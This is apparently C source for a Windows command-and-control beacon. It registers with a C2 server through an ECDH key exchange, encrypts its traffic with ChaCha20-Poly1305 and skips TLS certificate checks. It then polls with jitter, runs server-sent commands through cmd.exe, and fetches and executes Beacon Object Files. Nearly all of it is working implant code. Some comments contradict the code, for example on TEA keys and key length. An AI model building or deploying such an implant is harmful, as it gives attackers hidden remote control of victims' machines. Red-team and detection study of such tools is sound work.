#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <bcrypt.h>

#include "COFFLoader.h"
#include "beacon_compatibility.h"
#include "config.h"

// ---------------------------------------------------------------------------
// Compile-time configuration
// ---------------------------------------------------------------------------
#define SERVER_IP        C2_SERVER_IP
#define SERVER_PORT      C2_SERVER_PORT
#define USER_AGENT       C2_USER_AGENT

#define OUTPUT_BUF_SIZE  (256 * 1024)
#define HTTP_BUF_SIZE    (512 * 1024)
#define CMD_BUF_SIZE     4096
#define PATH_BUF_SIZE    512
#define AGENT_ID_SIZE    256

#define SLEEP_BASE_MS    5000
#define SLEEP_JITTER_MS  3000

// ---------------------------------------------------------------------------
// Output buffer (unchanged)
// ---------------------------------------------------------------------------
static char *beacon_buf     = NULL;
static int   beacon_buf_pos = 0;
static int   beacon_buf_cap = 0;
static char  cwd[MAX_PATH]  = {0};

// ---------------------------------------------------------------------------
// ChaCha20-Poly1305 AEAD encryption — key derived per-session via ECDH
// Format: [12-byte nonce][ciphertext+16-byte auth tag]
// ---------------------------------------------------------------------------

static uint8_t SESSION_KEY[32] = {0};  // set once during registration (32 bytes for ChaCha20-Poly1305)

// Encrypt plaintext with ChaCha20-Poly1305 using BCrypt
// Returns: nonce || ciphertext || auth_tag (12 + len + 16 bytes)
static uint8_t *chacha20poly1305_encrypt(const uint8_t *plaintext, size_t plain_len,
                                          size_t *out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    uint8_t *nonce = NULL;
    uint8_t *result = NULL;
    
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed (ChaCha20-Poly1305 requires Windows 10 1709+?)\n");
        goto cleanup;
    }

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, SESSION_KEY, 32, 0))) {
        fprintf(stderr, "[!] BCryptGenerateSymmetricKey failed\n");
        goto cleanup;
    }

    // Allocate nonce (12 bytes) + ciphertext (plain_len) + auth tag (16 bytes)
    nonce = (uint8_t *)malloc(12);
    if (!nonce) goto cleanup;
    gen_random_bytes(nonce, 12);

    // Output buffer: nonce (12) + ciphertext (plain_len) + tag (16)
    size_t ciphertext_len = plain_len;
    size_t tag_len = 16;
    *out_len = 12 + ciphertext_len + tag_len;
    result = (uint8_t *)malloc(*out_len);
    if (!result) goto cleanup;

    // Copy nonce to output
    memcpy(result, nonce, 12);

    // BCrypt ChaCha20-Poly1305 encryption
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;
    authInfo.pbTag = result + 12 + ciphertext_len;  // Auth tag after ciphertext
    authInfo.cbTag = tag_len;
    authInfo.pbIV = nonce;
    authInfo.cbIV = 12;

    ULONG bytes_written = 0;
    NTSTATUS status = BCryptEncrypt(hKey, (PUCHAR)plaintext, (ULONG)plain_len,
                                    &authInfo,
                                    NULL, 0,
                                    result + 12, (ULONG)ciphertext_len,
                                    &bytes_written, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[!] BCryptEncrypt failed: 0x%08lX\n", (unsigned long)status);
        free(result);
        result = NULL;
        goto cleanup;
    }

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    free(nonce);
    return result;
}

// Decrypt ciphertext with ChaCha20-Poly1305 using BCrypt
// Input: nonce || ciphertext || auth_tag
// Returns: plaintext (or NULL on failure)
static uint8_t *chacha20poly1305_decrypt(const uint8_t *encrypted, size_t enc_len,
                                          size_t *out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    uint8_t *result = NULL;
    
    *out_len = 0;
    if (enc_len < 12 + 16) {
        fprintf(stderr, "[!] Encrypted data too short\n");
        return NULL;
    }

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed (ChaCha20-Poly1305 requires Windows 10 1709+?)\n");
        goto cleanup;
    }

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, SESSION_KEY, 32, 0))) {
        fprintf(stderr, "[!] BCryptGenerateSymmetricKey failed\n");
        goto cleanup;
    }

    uint8_t *nonce = (uint8_t *)encrypted;
    const uint8_t *ciphertext = encrypted + 12;
    size_t cipher_len = enc_len - 12 - 16;
    const uint8_t *tag = encrypted + 12 + cipher_len;

    result = (uint8_t *)malloc(cipher_len + 1);
    if (!result) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = {0};
    authInfo.cbSize = sizeof(authInfo);
    authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = 16;
    authInfo.pbIV = nonce;
    authInfo.cbIV = 12;

    ULONG bytes_written = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)cipher_len,
                                    &authInfo,
                                    NULL, 0,
                                    result, (ULONG)cipher_len,
                                    &bytes_written, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[!] BCryptDecrypt failed: 0x%08lX\n", (unsigned long)status);
        free(result);
        return NULL;
    }

    result[cipher_len] = '\0';
    *out_len = cipher_len;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ---------------------------------------------------------------------------
// BCrypt RNG — used for nonces and ECDH keypair generation
// ---------------------------------------------------------------------------
static void gen_random_bytes(uint8_t *buf, size_t len) {
    BCRYPT_ALG_HANDLE hAlg;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
        BCryptGenRandom(hAlg, buf, (ULONG)len, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    } else {
        // fallback — should never be reached
        for (size_t i = 0; i < len; i++)
            buf[i] = (uint8_t)(rand() & 0xFF);
    }
}

// ---------------------------------------------------------------------------
// SHA-256 via BCrypt — used as KDF: SESSION_KEY = SHA-256(shared_secret)[:16]
// ---------------------------------------------------------------------------
static int bcrypt_sha256(const uint8_t *data, ULONG data_len, uint8_t out[32]) {
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptHashData(hHash, (PUCHAR)data, data_len, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hHash, out, 32, 0)))
        goto cleanup;
    result = 0;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// ---------------------------------------------------------------------------
// ECDH-P256 key exchange
//
// Wire format (all plaintext, only during /register):
//   Beacon  →  Server : 0x04 || X[32] || Y[32]          (65 bytes, X9.62 uncompressed)
//   Server  →  Beacon : 0x04 || X[32] || Y[32] || uuid  (65 + 36 = 101 bytes)
//
// Both sides compute:
//   shared_secret  = ECDH(our_priv, peer_pub)            (32-byte X coordinate)
//   SESSION_KEY    = SHA-256(shared_secret)[:16]          (16-byte TEA key)
//
// All subsequent traffic is chacha20poly1305 encrypted with SESSION_KEY.
// ---------------------------------------------------------------------------

// Build a BCRYPT_ECCKEY_BLOB from a raw 65-byte X9.62 uncompressed point.
// Skips the leading 0x04 byte; layout: [magic(4)][cbKey(4)][X(32)][Y(32)]
static int import_peer_pubkey(const uint8_t peer_x962[65], BCRYPT_KEY_HANDLE *hKey_out) {
    uint8_t  blob[8 + 64];
    uint32_t magic = 0x314B4345u;  // BCRYPT_ECDH_PUBLIC_P256_MAGIC
    uint32_t cbKey = 32;
    memcpy(blob,      &magic, 4);
    memcpy(blob +  4, &cbKey, 4);
    memcpy(blob +  8, peer_x962 + 1, 64); // skip the 0x04 prefix

    BCRYPT_ALG_HANDLE hAlg = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    NTSTATUS status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                          hKey_out, blob, sizeof(blob), 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[!] BCryptImportKeyPair failed: 0x%08lX\n", (unsigned long)status);
    } else {
        result = 0;
    }
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Generate ephemeral P-256 keypair. Exports our public key as 65-byte X9.62.
// Caller owns hPrivKey_out and must BCryptDestroyKey it after deriving the secret.
static int gen_ecdh_keypair(BCRYPT_KEY_HANDLE *hPrivKey_out, uint8_t our_pub_x962[65]) {
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    int               result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateKeyPair(hAlg, hPrivKey_out, 256, 0))) {
        fprintf(stderr, "[!] BCryptGenerateKeyPair failed\n");
        goto cleanup;
    }
    if (!BCRYPT_SUCCESS(BCryptFinalizeKeyPair(*hPrivKey_out, 0))) {
        fprintf(stderr, "[!] BCryptFinalizeKeyPair failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    // Export: BCRYPT_ECCKEY_BLOB = [magic(4)][cbKey(4)][X(32)][Y(32)]
    uint8_t blob[8 + 64];
    ULONG   blob_len = 0;
    if (!BCRYPT_SUCCESS(BCryptExportKey(*hPrivKey_out, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                        blob, sizeof(blob), &blob_len, 0))
        || blob_len < 8 + 64) {
        fprintf(stderr, "[!] BCryptExportKey failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    // Convert to X9.62 uncompressed: 0x04 || X || Y
    our_pub_x962[0] = 0x04;
    memcpy(our_pub_x962 + 1, blob + 8, 64);
    result = 0;

cleanup:
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

// Perform ECDH and derive SESSION_KEY = SHA-256(raw_shared_secret)[:32].
// Destroys hPrivKey and hPeerPub when done regardless of outcome.
static int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub) {
    BCRYPT_SECRET_HANDLE hSecret = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptSecretAgreement(hPrivKey, hPeerPub, &hSecret, 0))) {
        fprintf(stderr, "[!] BCryptSecretAgreement failed\n");
        goto cleanup;
    }

    // Extract raw shared secret (X coordinate, 32 bytes for P-256)
    ULONG raw_len = 0;
    BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL, NULL, 0, &raw_len, 0);
    if (raw_len == 0) {
        fprintf(stderr, "[!] BCryptDeriveKey (size query) returned 0\n");
        goto cleanup;
    }

    uint8_t *raw = (uint8_t *)malloc(raw_len);
    if (!raw) goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL,
                                         raw, raw_len, &raw_len, 0))) {
        fprintf(stderr, "[!] BCryptDeriveKey (extract) failed\n");
        free(raw);
        goto cleanup;
    }

    // KDF: SESSION_KEY = SHA-256(shared_secret)[:32] for ChaCha20-Poly1305
    uint8_t hash[32];
    if (bcrypt_sha256(raw, raw_len, hash) == 0) {
        memcpy(SESSION_KEY, hash, 32);  // use all 32 bytes
        SecureZeroMemory(hash, 32);
        result = 0;
    }
    SecureZeroMemory(raw, raw_len);
    free(raw);

cleanup:
    if (hSecret) BCryptDestroySecret(hSecret);
    BCryptDestroyKey(hPrivKey);
    BCryptDestroyKey(hPeerPub);
    return result;
}


static void buf_append(const char *data, int len) {
    if (!beacon_buf) return;
    if (beacon_buf_pos + len >= beacon_buf_cap) {
        const char *msg = "[!] Output buffer full\n";
        int msglen = (int)strlen(msg);
        if (beacon_buf_pos + msglen < beacon_buf_cap) {
            memcpy(beacon_buf + beacon_buf_pos, msg, msglen);
            beacon_buf_pos += msglen;
        }
        return;
    }
    memcpy(beacon_buf + beacon_buf_pos, data, len);
    beacon_buf_pos += len;
}

static void buf_reset(void) {
    beacon_buf_pos = 0;
    if (beacon_buf) memset(beacon_buf, 0, beacon_buf_cap);
}

void beacon_log(const char *fmt, ...) {
    if (!beacon_buf) return;
    char tmp[2048];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (n > 0) buf_append(tmp, n);
}

// ---------------------------------------------------------------------------
// WinHTTP wrapper for HTTP(S) POST requests.
// ---------------------------------------------------------------------------
static int http_post_winhttp(const char *host, int port, const char *path,
                             const uint8_t *body, int body_len,
                             uint8_t **out_body, int *out_body_len) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char      headers[512] = {0};
    uint8_t  *resp = NULL;
    int       ret = -1;
    DWORD     bytes_available = 0;
    DWORD     bytes_read = 0;
    int       total = 0;
    DWORD     flags = 0;
    wchar_t   wide_host[PATH_BUF_SIZE] = {0};
    wchar_t   wide_path[PATH_BUF_SIZE] = {0};
    wchar_t   wide_agent[PATH_BUF_SIZE] = {0};
    wchar_t   wide_headers[512] = {0};

    *out_body = NULL;
    *out_body_len = 0;

#if C2_USE_HTTPS
    flags = WINHTTP_FLAG_SECURE;
#endif

    const char *auth_token = C2_AUTH_TOKEN;
    if (auth_token[0] != '\0') {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\n"
                 "User-Agent: %s\r\n"
                 "X-C2-Token: %s\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "Connection: close\r\n",
                 host, port, USER_AGENT, auth_token);
    } else {
        snprintf(headers, sizeof(headers),
                 "Host: %s:%d\r\n"
                 "User-Agent: %s\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "Connection: close\r\n",
                 host, port, USER_AGENT);
    }

    if (!MultiByteToWideChar(CP_UTF8, 0, host, -1, wide_host, PATH_BUF_SIZE))
        goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, path, -1, wide_path, PATH_BUF_SIZE))
        goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, USER_AGENT, -1, wide_agent, PATH_BUF_SIZE))
        goto cleanup;
    if (!MultiByteToWideChar(CP_UTF8, 0, headers, -1, wide_headers, 512))
        goto cleanup;

    hSession = WinHttpOpen(wide_agent,
                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS,
                           0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, wide_host, port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect,
                                  L"POST",
                                  wide_path,
                                  NULL,
                                  WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  flags);
    if (!hRequest) goto cleanup;

#if C2_USE_HTTPS
    {
        DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                               SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                               SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest,
                         WINHTTP_OPTION_SECURITY_FLAGS,
                         &security_flags,
                         sizeof(security_flags));
    }
#endif

    if (!WinHttpAddRequestHeaders(hRequest, wide_headers, -1L, WINHTTP_ADDREQ_FLAG_ADD))
        goto cleanup;

    if (!WinHttpSendRequest(hRequest,
                            WINHTTP_NO_ADDITIONAL_HEADERS,
                            0,
                            (LPVOID)body,
                            body_len,
                            body_len,
                            0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
    if (!resp) goto cleanup;

    while (WinHttpQueryDataAvailable(hRequest, &bytes_available) &&
           bytes_available > 0 &&
           total < HTTP_BUF_SIZE - 1) {
        if (bytes_available > (DWORD)(HTTP_BUF_SIZE - 1 - total))
            bytes_available = HTTP_BUF_SIZE - 1 - total;

        if (!WinHttpReadData(hRequest, resp + total, bytes_available, &bytes_read))
            goto cleanup;
        if (bytes_read == 0) break;
        total += (int)bytes_read;
    }

    if (total <= 0) goto cleanup;

    *out_body = resp;
    *out_body_len = total;
    resp = NULL;
    ret = 0;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    free(resp);
    return ret;
}

static int http_post_raw(const char *host, int port, const char *path,
                         const uint8_t *body, int body_len,
                         uint8_t **out_body, int *out_body_len) {
    return http_post_winhttp(host, port, path, body, body_len, out_body, out_body_len);
}

// ---------------------------------------------------------------------------
// Encrypted HTTP POST — ChaCha20-Poly1305 AEAD, used for all traffic after key exchange
// Format: [12-byte nonce][ciphertext + 16-byte auth tag]
// ---------------------------------------------------------------------------
static int http_post_encrypted(const char *host, int port, const char *path,
                                const uint8_t *plain_data, int plain_len,
                                uint8_t **out_plain, int *out_plain_len) {
    uint8_t *enc_body = NULL;
    uint8_t *resp = NULL;
    size_t  enc_len = 0;
    int     raw_resp_len = 0;
    int     ret = -1;
    uint8_t empty_body[1] = {0};
    const uint8_t *payload = plain_data ? plain_data : empty_body;

    *out_plain = NULL;
    *out_plain_len = 0;

    enc_body = chacha20poly1305_encrypt(payload, plain_len, &enc_len);
    if (!enc_body) goto cleanup;

    if (http_post_winhttp(host, port, path, enc_body, (int)enc_len, &resp, &raw_resp_len) != 0)
        goto cleanup;

    if (!resp || raw_resp_len < 12 + 16) goto cleanup;

    size_t decrypted_len = 0;
    uint8_t *plain = chacha20poly1305_decrypt(resp, raw_resp_len, &decrypted_len);
    if (!plain) goto cleanup;

    *out_plain = plain;
    *out_plain_len = (int)decrypted_len;
    ret = 0;

cleanup:
    free(enc_body);
    free(resp);
    return ret;
}

// ---------------------------------------------------------------------------
// Key exchange + registration
//
// 1. Generate ephemeral P-256 keypair
// 2. POST our pubkey (65 bytes X9.62) to /register  — plaintext
// 3. Server responds: server pubkey (65 bytes) + agent UUID (36 bytes)
// 4. Derive SESSION_KEY = SHA-256(ECDH shared secret)[:32]
// 5. All subsequent requests use ChaCha20-Poly1305 AEAD with SESSION_KEY
// ---------------------------------------------------------------------------
static int do_register(char agent_id[AGENT_ID_SIZE]) {
    BCRYPT_KEY_HANDLE hPriv    = NULL;
    BCRYPT_KEY_HANDLE hPeerPub = NULL;
    uint8_t  our_pub[65]  = {0};
    uint8_t *resp         = NULL;
    int      resp_len     = 0;
    int      result       = -1;

    fprintf(stderr, "[*] Generating ephemeral ECDH-P256 keypair\n");
    if (gen_ecdh_keypair(&hPriv, our_pub) != 0)
        return -1;

    fprintf(stderr, "[*] Sending pubkey to %s:%d\n", SERVER_IP, SERVER_PORT);
    if (http_post_raw(SERVER_IP, SERVER_PORT, "/register",
                      our_pub, 65, &resp, &resp_len) != 0 || !resp) {
        fprintf(stderr, "[!] /register request failed\n");
        BCryptDestroyKey(hPriv);
        return -1;
    }

    // Response must be at least 65 (server pub) + 1 (uuid) bytes
    if (resp_len < 66) {
        fprintf(stderr, "[!] /register response too short (%d bytes)\n", resp_len);
        goto cleanup;
    }
    if (resp[0] != 0x04) {
        fprintf(stderr, "[!] /register response missing X9.62 prefix\n");
        goto cleanup;
    }

    // Import server's public key from the first 65 bytes
    if (import_peer_pubkey(resp, &hPeerPub) != 0)
        goto cleanup;

    // Derive SESSION_KEY — destroys hPriv and hPeerPub on return
    if (derive_session_key(hPriv, hPeerPub) != 0) {
        hPriv    = NULL;
        hPeerPub = NULL;
        goto cleanup;
    }
    hPriv    = NULL;
    hPeerPub = NULL;
    fprintf(stderr, "[*] Session key established\n");

    // Agent UUID follows the 65-byte server pubkey
    int id_len = resp_len - 65;
    if (id_len >= AGENT_ID_SIZE) id_len = AGENT_ID_SIZE - 1;
    memcpy(agent_id, resp + 65, id_len);
    agent_id[id_len] = '\0';

    char *nl;
    if ((nl = strchr(agent_id, '\r'))) *nl = '\0';
    if ((nl = strchr(agent_id, '\n'))) *nl = '\0';

    if (agent_id[0] == '\0') {
        fprintf(stderr, "[!] Empty agent ID in response\n");
        goto cleanup;
    }
    fprintf(stderr, "[*] Registered as %.8s\n", agent_id);
    result = 0;

cleanup:
    free(resp);
    if (hPriv)    BCryptDestroyKey(hPriv);
    if (hPeerPub) BCryptDestroyKey(hPeerPub);
    return result;
}

// ---------------------------------------------------------------------------
// BOF execution (unchanged)
// ---------------------------------------------------------------------------
int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_len) {
    char *coff_args = malloc(args_len + 4);
    if (!coff_args) return 1;
    *(DWORD *)coff_args = (DWORD)args_len;
    if (args_len > 0)
        memcpy(coff_args + 4, args, args_len);
    int   result     = RunCOFF("go", bof_data, bof_size, (unsigned char *)coff_args, args_len + 4);
    int   out_size   = 0;
    char *bof_output = BeaconGetOutputData(&out_size);
    if (bof_output && out_size > 0) {
        buf_append(bof_output, out_size);
        free(bof_output);
    }
    free(coff_args);
    return result;
}

// ---------------------------------------------------------------------------
// cd & shell (unchanged)
// ---------------------------------------------------------------------------
static void handle_cd(const char *target) {
    char new_path[MAX_PATH];
    if (!target || target[0] == '\0' || (target[0] == '~' && target[1] == '\0')) {
        const char *home = getenv("USERPROFILE");
        if (!home) home = "C:\\";
        strncpy(new_path, home, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else if (target[1] == ':' || target[0] == '\\') {
        strncpy(new_path, target, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else {
        snprintf(new_path, MAX_PATH, "%s\\%s", cwd, target);
    }
    DWORD attr = GetFileAttributesA(new_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        beacon_log("cd: not found: %s\n", new_path);
        return;
    }
    char resolved[MAX_PATH];
    if (!GetFullPathNameA(new_path, MAX_PATH, resolved, NULL)) {
        beacon_log("cd: resolve failed\n");
        return;
    }
    strncpy(cwd, resolved, MAX_PATH - 1);
    cwd[MAX_PATH - 1] = '\0';
    SetCurrentDirectoryA(cwd);
    beacon_log("%s\n", cwd);
}

void execute_shell_command(const char *command) {
    if (strncmp(command, "cd", 2) == 0 && (command[2] == ' ' || command[2] == '\0')) {
        handle_cd(command[2] == ' ' ? command + 3 : "");
        return;
    }
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        beacon_log("[!] CreatePipe failed: %lu\n", GetLastError());
        return;
    }
    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    PROCESS_INFORMATION pi;
    char cmd_line[CMD_BUF_SIZE + 32];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);
    if (CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, cwd[0] ? cwd : NULL, &si, &pi)) {
        CloseHandle(hWrite);
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            beacon_log("[!] Command timed out\n");
        } else {
            DWORD bytes_read;
            char  tmp[4096];
            while (ReadFile(hRead, tmp, sizeof(tmp) - 1, &bytes_read, NULL) && bytes_read > 0) {
                tmp[bytes_read] = '\0';
                buf_append(tmp, (int)bytes_read);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        beacon_log("[!] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(void) {
    char agent_id[AGENT_ID_SIZE] = {0};

    srand((unsigned int)GetTickCount());
    beacon_buf     = calloc(OUTPUT_BUF_SIZE, 1);
    beacon_buf_cap = OUTPUT_BUF_SIZE;
    if (!beacon_buf) return 1;
    GetCurrentDirectoryA(MAX_PATH, cwd);

    // ECDH key exchange + registration (plaintext round-trip)
    if (do_register(agent_id) != 0) {
        fprintf(stderr, "[!] Registration failed\n");
        free(beacon_buf); return 1;
    }

    // Initial checkin (now TEA-CTR encrypted with SESSION_KEY)
    char     path[PATH_BUF_SIZE];
    uint8_t *resp = NULL; int resp_len = 0;
    snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
    http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                        (uint8_t *)beacon_buf, beacon_buf_pos, &resp, &resp_len);
    free(resp);
    buf_reset();

    // Main loop (unchanged from original)
    while (1) {
        snprintf(path, PATH_BUF_SIZE, "/checkin/%s", agent_id);
        uint8_t *cmd_plain = NULL; int cmd_len = 0;
        if (http_post_encrypted(SERVER_IP, SERVER_PORT, path,
                                (uint8_t *)beacon_buf, beacon_buf_pos,
                                &cmd_plain, &cmd_len) == 0 && cmd_plain) {
            buf_reset();
            if (cmd_len > 0) {
                char safe_cmd[CMD_BUF_SIZE];
                strncpy(safe_cmd, (char *)cmd_plain, CMD_BUF_SIZE - 1);
                safe_cmd[CMD_BUF_SIZE - 1] = '\0';
                char *end = safe_cmd + strlen(safe_cmd) - 1;
                while (end >= safe_cmd && (*end == '\r' || *end == '\n' || *end == ' '))
                    *end-- = '\0';
                if (safe_cmd[0] != '\0') {
                    if (strncmp(safe_cmd, "BOF:", 4) == 0) {
                        char *bof_name = safe_cmd + 4;
                        char *args_hex = strchr(bof_name, ':');
                        if (args_hex) {
                            *args_hex++ = '\0';
                            uint8_t *bof_data = NULL; int bof_len = 0;
                            char bof_path[PATH_BUF_SIZE];
                            snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s", agent_id, bof_name);
                            if (http_post_encrypted(SERVER_IP, SERVER_PORT, bof_path,
                                                    NULL, 0, &bof_data, &bof_len) == 0 && bof_data) {
                                int hex_len  = (int)strlen(args_hex);
                                int args_len = hex_len / 2;
                                char *args   = malloc(args_len + 1);
                                if (args) {
                                    for (int i = 0; i < args_len; i++) {
                                        unsigned int b;
                                        sscanf(args_hex + i * 2, "%2x", &b);
                                        args[i] = (char)b;
                                    }
                                    execute_bof(bof_data, bof_len, args, args_len);
                                    free(args);
                                }
                                free(bof_data);
                            }
                        }
                    } else {
                        execute_shell_command(safe_cmd);
                    }
                }
            }
            free(cmd_plain);
        } else {
            buf_reset();
        }
        DWORD sleep_ms = SLEEP_BASE_MS + (rand() % (SLEEP_JITTER_MS * 2)) - SLEEP_JITTER_MS;
        if (sleep_ms < 1000) sleep_ms = 1000;
        Sleep(sleep_ms);
    }

    free(beacon_buf);
    return 0;
}